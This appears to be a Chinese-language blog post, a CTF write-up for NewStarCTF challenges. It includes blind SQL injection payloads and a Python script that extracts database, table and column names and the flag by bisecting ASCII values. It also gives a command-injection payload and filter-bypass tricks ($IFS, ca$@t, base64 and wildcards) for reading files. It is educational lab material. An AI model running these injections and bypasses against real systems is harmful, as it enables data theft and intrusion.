@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="X2n" />
+
+  <!-- 搜索引擎摘要：优先页面自定义 description / excerpt / 正文前 160 字，最后回落到站点 description -->
+  
+  
+    <meta name="description" content="[NewStarCTF 2023] web week3 midsql_sql 通过布尔判断存在sql注入。 数据库名为： ctf ， left(&#39;abcde&#39;,3)=&#39;abc&#39; 从字符串的左边开始截取3个字符。 经过测试发现，无法进行union注入，select等敏感函数被过滤，可通过大小写绕过。 关键函数 group…" />
+  
+  
+    <meta name="keywords" content="X2n,Web安全,漏洞挖掘,渗透测试,SRC,内网渗透,Kubernetes 安全,云安全,安全研究,技术博客" />
+  
+
+  
+  
+  <title>
+    
+      CTF做题记录 
+      
+      
+      |
+    
+     Keep your passion for what you love !
+  </title>
+
+  
+
+  <!-- Canonical URL：避免重复内容降权 -->
+  <link rel="canonical" href="https://x2nn.github.io/2024/07/14/CTF做题记录/" />
+
+  <!-- Open Graph (Facebook / 微信 / 飞书 / LinkedIn) -->
+  <meta property="og:site_name" content="Keep your passion for what you love !" />
+  <meta property="og:title" content="CTF做题记录 | Keep your passion for what you love !" />
+  
+    <meta property="og:description" content="[NewStarCTF 2023] web week3 midsql_sql 通过布尔判断存在sql注入。 数据库名为： ctf ， left(&#39;abcde&#39;,3)=&#39;abc&#39; 从字符串的左边开始截取3个字符。 经过测试发现，无法进行union注入，select等敏感函数被过滤，可通过大小写绕过。 关键函数 group…" />
+  
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://x2nn.github.io/2024/07/14/CTF做题记录/" />
+  <meta property="og:image" content="https://x2nn.github.io/images/avatar.png" />
+  <meta property="og:locale" content="zh_CN" />
+  
+    
+      <meta property="article:published_time" content="2024-07-14T08:41:22.000Z" />
+    
+    
+      <meta property="article:modified_time" content="2025-02-22T15:46:56.942Z" />
+    
+    
+      <meta property="article:tag" content="SQL注入" />
+    
+      <meta property="article:tag" content="二分法" />
+    
+      <meta property="article:tag" content="RCE" />
+    
+  
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="CTF做题记录 | Keep your passion for what you love !" />
+  
+    <meta name="twitter:description" content="[NewStarCTF 2023] web week3 midsql_sql 通过布尔判断存在sql注入。 数据库名为： ctf ， left(&#39;abcde&#39;,3)=&#39;abc&#39; 从字符串的左边开始截取3个字符。 经过测试发现，无法进行union注入，select等敏感函数被过滤，可通过大小写绕过。 关键函数 group…" />
+  
+  <meta name="twitter:image" content="https://x2nn.github.io/images/avatar.png" />
+
+  <!-- RSS 订阅：浏览器与阅读器可自动发现 -->
+  <link rel="alternate" type="application/atom+xml" title="Keep your passion for what you love ! Atom Feed" href="/atom.xml" />
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+  
+<script src="/js/progressBar.js"></script>
+
+  
+<script src="/js/headerlinkCopy.js"></script>
+
+
+  
+
+  
+
+  <!-- Cloudflare Web Analytics（零 cookie、隐私友好） -->
+  
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js"
+            data-cf-beacon='{"token": "1e1fd0957b6d4ca8a09a54a598b7b525"}'></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="" loading="lazy" decoding="async">
+      
+    </a>
+    <div class="nickname"><a href="/"></a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Category</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/collections/">
+          <a href="/collections/">Collections</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">CTF做题记录</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2025-02-22 23:46:56
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">
+                    #SQL注入
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E4%BA%8C%E5%88%86%E6%B3%95/" title="二分法">
+                    #二分法
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/RCE/" title="RCE">
+                    #RCE
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/CTF/" title="CTF">
+                    <b>#</b> CTF
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h3 id="newstarctf-2023-web-week3-midsql_sql" tabindex="-1"><a class="headerlink" href="#newstarctf-2023-web-week3-midsql_sql" aria-hidden="true"></a> [NewStarCTF 2023] web week3 midsql_sql</h3>
+<p>通过布尔判断存在sql注入。</p>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_1.png" alt loading="lazy" decoding="async"></p>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_2.png" alt loading="lazy" decoding="async"></p>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_3.png" alt loading="lazy" decoding="async"></p>
+<p>数据库名为：<code>ctf</code>，<code>left('abcde',3)='abc'</code>从字符串的左边开始截取3个字符。</p>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_4.png" alt loading="lazy" decoding="async"></p>
+<p>经过测试发现，无法进行union注入，select等敏感函数被过滤，可通过大小写绕过。</p>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/no_union.png" alt loading="lazy" decoding="async"></p>
+<p>关键函数<code>group_concat(table_name)</code>，将分组中的值连接组合，即这里将表名连接组合。通过此函数得到表名、列名。</p>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_5.png" alt loading="lazy" decoding="async"></p>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/sql_6.png" alt loading="lazy" decoding="async"></p>
+<p>利用到的payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; &amp;&amp; 1-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> <span class="number">0</span><span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27; &amp;&amp; if((length(database())=3),1,0)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> <span class="keyword">left</span>(database(),<span class="number">3</span>)<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span><span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27; &amp;&amp; if(Ascii(Substr((Select Group_concat(table_name) From infOrmation_schema.tables Where Table_schema=&#x27;</span>ctf<span class="string">&#x27;),1,1))=t,1,0)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="operator">&amp;&amp;</span> if(Ascii(Substr((<span class="keyword">Select</span> Group_concat(column_name) <span class="keyword">From</span> infOrmation_schema.columns <span class="keyword">Where</span> Table_name<span class="operator">=</span><span class="string">&#x27;here_is_flag&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span>t,<span class="number">1</span>,<span class="number">0</span>)<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>
+<p>通过上述的获取表名和列名的sql语句，通过字符的<strong>ASCII</strong>和<strong>t</strong>比较大小，可以利用二分法快速输出数据库名、表名、列名等信息。</p>
+<p>个人感觉比较好用的poc如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;http://8bbb955c-7d10-474e-8234-4da0fb1ae4d9.node5.buuoj.cn:81/?id=TMP0919&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DBname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--库名</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#根据数据包的特征判断</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据库名为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TBname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--表名</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(table_name) From infOrmation_schema.tables Where Table_schema=&#x27;ctf&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据表名为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CLname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--列名</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(column_name) From infOrmation_schema.columns Where Table_name=&#x27;here_is_flag&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据列名为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Valname</span>():  </span><br><span class="line">    <span class="keyword">global</span> host</span><br><span class="line">    flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            <span class="comment">#--报数据</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; %26%26 if(Ascii(Substr((Select Group_concat(flag) From here_is_flag),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i=i, mid=mid)</span><br><span class="line">            res = requests.get(host + payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Physics&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;数据为：&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line">DBname()</span><br><span class="line">TBname()</span><br><span class="line">CLname()</span><br><span class="line">Valname()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可得到flag</p>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/flag.png" alt loading="lazy" decoding="async"></p>
+<p>参考</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/133694293">[NewStarCTF 2023] web题解</a></li>
+</ul>
+<h3 id="newstarctf-公开赛赛道so-baby-rce" tabindex="-1"><a class="headerlink" href="#newstarctf-公开赛赛道so-baby-rce" aria-hidden="true"></a> [NewStarCTF 公开赛赛道]So Baby RCE</h3>
+<p>题目如下：</p>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce_1.png" alt loading="lazy" decoding="async"></p>
+<p>发现代码中没有过滤<code>ls</code></p>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce_2.png" alt loading="lazy" decoding="async"></p>
+<p>当前目录下什么东西，尝试跨目录读取文件，<code>cd </code>未过滤，<code>&amp;</code>未过滤，<code>cat</code>被过滤，通过添加特殊字符绕过<code>ca$@t</code>。记住$@特殊字符的使用，很多情况下可以绕过。</p>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce_3.png" alt loading="lazy" decoding="async"></p>
+<p>Payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd%09..%26%26cd%09..%26%26cd%09..%26%26ls%26%26ca$@t%09ffff$@llllaaaaggggg</span><br></pre></td></tr></table></figure>
+<h4 id="空格代替" tabindex="-1"><a class="headerlink" href="#空格代替" aria-hidden="true"></a> 空格代替</h4>
+<p>命令执行中空格被过滤。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">IFS<span class="variable">$9</span></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">09</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce1_1_1.png" alt loading="lazy" decoding="async"></p>
+<blockquote>
+<p><code>$IFS</code>在linux下表示分隔符，只有<code>cat$IFSa.txt</code>的时候，bash解析器会把整个IFSa当作变量名，所以导致没有办法运行，然而如果加上{}就固定了变量名，同理在后面加个$可以起到截断的作用。</p>
+<p><code>$9</code>指的是当前系统shell进程的第九个参数的持有者，若没有9个参数，则为空，因此$9相当于没有加东西，等于做了一个前后隔离。</p>
+</blockquote>
+<p>不仅仅局限于<code>$9</code>，$加一个一位数字均可。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">echo &quot;参数1：&quot; $1</span><br><span class="line">echo &quot;参数2：&quot; $2</span><br><span class="line">echo &quot;参数3：&quot; $3</span><br><span class="line">echo &quot;参数4：&quot; $4</span><br><span class="line">echo &quot;参数5：&quot; $5</span><br><span class="line">echo &quot;参数6：&quot; $6</span><br><span class="line">echo &quot;参数7：&quot; $7</span><br><span class="line">echo &quot;参数8：&quot; $8</span><br><span class="line">echo &quot;参数9：&quot; $9</span><br><span class="line">echo &quot;参数10：&quot; $10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试  ./test.sh a b c d c d e f g h</span> </span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce1_1_2.png" alt loading="lazy" decoding="async"></p>
+<blockquote>
+<p><code>$8、$9</code>因为没有传递参数，返回的结果为空。</p>
+<p><code>$10</code>被解析成了<code>$1</code>和0，所以结果会是<code>a0</code>，若想获取第10个变量使用<code>${10}</code>。</p>
+</blockquote>
+<h4 id="读取内容" tabindex="-1"><a class="headerlink" href="#读取内容" aria-hidden="true"></a> 读取内容</h4>
+<p>列出目录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee #ls -l| tee 1.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>tee命令通常的用法是将一个命令的输出保存到文件中，同时在终端上显示输出内容。</p>
+</blockquote>
+<p>读取文件</p>
+<p><code>cat</code>被禁用，使用下列命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat   # 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac   # 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more  # 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less  # 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head  # 只显示头几行</span><br><span class="line">tail  # 只显示最后几行</span><br><span class="line">nl    # 类似于cat -n，显示时输出行号</span><br><span class="line">tailf # 类似于tail -f</span><br><span class="line">sort # 读文件</span><br></pre></td></tr></table></figure>
+<h4 id="加特殊字符绕过" tabindex="-1"><a class="headerlink" href="#加特殊字符绕过" aria-hidden="true"></a> 加特殊字符绕过</h4>
+<p><code>cat</code>被禁用。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca\t fl\ag.txt</span><br><span class="line"><span class="meta prompt_">ca$</span><span class="language-bash">@t fl<span class="variable">$@ag</span>.txt</span></span><br><span class="line">c&#x27;a&#x27;t flag.txt</span><br><span class="line">c&quot;a&quot;t flag.txt</span><br></pre></td></tr></table></figure>
+<h4 id="编码绕过" tabindex="-1"><a class="headerlink" href="#编码绕过" aria-hidden="true"></a> 编码绕过</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo &#x27;Y2F0Cg==&#x27; | base64 -d`  flag.txt #cat </span><br></pre></td></tr></table></figure>
+<h4 id="拼接绕过" tabindex="-1"><a class="headerlink" href="#拼接绕过" aria-hidden="true"></a> 拼接绕过</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=f;d=lag;e=.txt;$a$b $c$d$e</span><br></pre></td></tr></table></figure>
+<h4 id="通配符绕过" tabindex="-1"><a class="headerlink" href="#通配符绕过" aria-hidden="true"></a> 通配符绕过</h4>
+<blockquote>
+<p>[…]表示匹配方括号之中的任意一个字符</p>
+<p>{…}表示匹配大括号里面的所有模式</p>
+<p>上述二则的区别，当匹配的文件不存在时，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat f?ag.txt</span><br><span class="line">cat fl*</span><br><span class="line">cat f[a-z]ag.txt</span><br><span class="line">cat fl&#123;a,b,c,d,e&#125;g.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce1_1_3.png" alt loading="lazy" decoding="async"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2025-02-22 23:46:56
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">
+                        #SQL注入
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E4%BA%8C%E5%88%86%E6%B3%95/" title="二分法">
+                        #二分法
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/RCE/" title="RCE">
+                        #RCE
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="分类"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/CTF/" title="CTF">
+                        <b>#</b> CTF
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2024/07/21/%E6%90%AD%E5%BB%BABurp-Collaborator/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
